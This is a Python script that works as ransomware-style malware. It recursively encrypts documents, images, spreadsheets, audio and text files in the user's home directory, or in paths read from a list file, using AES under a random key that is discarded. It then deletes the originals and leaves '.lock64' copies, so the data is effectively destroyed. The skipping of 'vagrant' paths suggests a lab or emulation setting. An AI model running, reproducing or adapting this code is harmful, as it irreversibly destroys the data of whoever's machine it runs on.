from Crypto.Cipher import AES
import hashlib, glob, os, string, random, struct, sys


def check_exts(filepath):
    extensions = [".doc", ".docx", ".pdf", ".pptx", ".xls", ".xlsx", ".csv", ".png", ".jpg", ".jpeg", ".mp3", ".txt"]
    ext = os.path.splitext(filepath)[-1].lower()
    return (ext in extensions)


def get_random_string(length):
    letters = string.ascii_lowercase
    result_string = "".join(random.choice(letters) for i in range(length))
    return result_string


def encryption_algo(filepath):
    chunksize = 64 * 1024
    password = get_random_string(16)
    key = hashlib.sha256(password.encode("utf-8")).digest()
    iv = os.urandom(16)
    aes = AES.new(key, AES.MODE_CBC, iv)
    file_size = os.path.getsize(filepath)
    name = os.path.splitext(os.path.basename(filepath))[0]
    path = os.path.dirname(filepath)

    new_filepath = path + "/{}.lock64".format(name)

    with open(filepath, "rb") as in_file:
        with open(new_filepath, "wb") as out_file:
            out_file.write(struct.pack("<Q", file_size))
            out_file.write(iv)
            while True:
                chunk = in_file.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += (" " * (16 - len(chunk) % 16)).encode("utf-8")
                out_file.write(aes.encrypt(chunk))

    if os.path.exists(filepath):
        os.remove(filepath)
        print("{} deleted.".format(filepath))


def encrypt_files(dir):
    dir = dir + "/*"
    for path in glob.glob(dir):
        if os.path.isdir(path):
            encrypt_files(path)
        elif os.path.isfile(path):
            if check_exts(path):
                print("Encrypting {}".format(path))
                encryption_algo(path)



def main():

    n = len(sys.argv)
    if n == 2:
        text_filepath = sys.argv[1]
        if text_filepath.endswith(".txt") and os.path.exists(text_filepath):
            file = open(text_filepath, "r")
            paths = file.readlines()
            print("Encrypting files specified in {}.".format(text_filepath))
            for path in paths:
                if "vagrant" not in path:
                    encryption_algo(path.strip())
        else:
            print("Please input a valid path to a text file.")
            return 0

    elif n > 2:
        print("Please input only 1 argument.")
        return 0

    home_dir = os.getenv("HOME")
    print("Encrypting files in {} directory".format(home_dir))
    encrypt_files(home_dir)
    return 0


if __name__ == "__main__":
    main()